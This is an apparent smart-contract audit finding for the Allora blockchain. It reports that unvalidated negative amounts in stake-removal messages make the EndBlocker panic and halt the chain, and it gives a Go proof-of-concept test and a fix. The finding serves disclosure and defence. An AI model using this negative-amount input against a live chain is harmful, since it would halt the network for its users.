Narrow Arctic Spider

High

# Adversary can arbitrarily trigger a chain halt by sending `MsgRemove{Delegate}Stake` with negative amount

## Summary
Adversary can trigger chain halt arbitrarily by sending `MsgRemoveStake` or `MsgRemoveDelegateStake` with negative amount.

## Vulnerability Detail
In `msg_server_stake.go`, `RemoveStake` and `RemoveDelegateStake` contain the logic for starting the stake removal process for reputers and delegators respectively. After `RemoveStakeDelayWindow` blocks have passed, the stake removal is processed at the start of the `emissions` module `EndBlocker`. To send the removed stake amount to the reputer/delegator, a new coins structure is created using the amount unstaked.
https://github.com/sherlock-audit/2024-06-allora/blob/4e1bc73db32873476f8b0a88945815d3978d931c/allora-chain/x/emissions/module/stake_removals.go#L13-L35
```go
func RemoveStakes(
	sdkCtx sdk.Context,
	currentBlock int64,
	k emissionskeeper.Keeper,
) {
	removals, err := k.GetStakeRemovalsForBlock(sdkCtx, currentBlock)
	...
	for _, stakeRemoval := range removals {
		...
		coins := sdk.NewCoins(sdk.NewCoin(chainParams.DefaultBondDenom, stakeRemoval.Amount))
```
(`RemoveDelegateStakes` follows similar logic)

Note that `sdk.NewCoin` will panic if the amount specified is negative.
https://github.com/cosmos/cosmos-sdk/blob/a32186608aab0bd436049377ddb34f90006fcbf7/types/coin.go#L25-L27
https://github.com/cosmos/cosmos-sdk/blob/a32186608aab0bd436049377ddb34f90006fcbf7/types/coin.go#L54-L56

The issue is the `Amount` parameter for the corresponding messages are integers and there is no validation that they are non-negative. Additionally, a negative amount to always passes the staked balance check. Consequently, anyone can send either `MsgRemoveStake` or `MsgRemoveDelegateStake` with a negative amount at any time and cause a chain halt when the stake removal matures.

<details>

<summary>PoC</summary>
The following test can be copied into `msg_server_stake_test.go` and will panic due to the negative coin amount. The PoC for `RemoveDelegateStake` is very similar.

```go
func (s *MsgServerTestSuite) TestRemoveStakeDoS() {
	ctx := s.ctx
	require := s.Require()
	keeper := s.emissionsKeeper
	senderAddr := sdk.AccAddress(PKS[0].Address())

	msg := &types.MsgRemoveStake{
		Sender:  senderAddr.String(),
		TopicId: uint64(123),
		Amount:  cosmosMath.NewInt(-1),
	}

	response, err := s.msgServer.RemoveStake(ctx, msg)
	require.NoError(err)
	require.NotNil(response)

	params, err := keeper.GetParams(ctx)
	require.NoError(err)
	ctx = ctx.WithBlockHeight(ctx.BlockHeight() + params.RemoveStakeDelayWindow)

	_ = s.appModule.EndBlock(ctx)
}
```

</details>

## Impact
Chain halt after `RemovalStakeDelayWindow` blocks due to negative coin amount in `EndBlocker`.

## Code Snippet
https://github.com/sherlock-audit/2024-06-allora/blob/4e1bc73db32873476f8b0a88945815d3978d931c/allora-chain/x/emissions/module/stake_removals.go#L13-L35
https://github.com/sherlock-audit/2024-06-allora/blob/4e1bc73db32873476f8b0a88945815d3978d931c/allora-chain/x/emissions/module/stake_removals.go#L66-L89

## Tool used

Manual Review

## Recommendation
Validate that `Amount` is non-negative in `RemoveStake` and `RemoveDelegateStake`.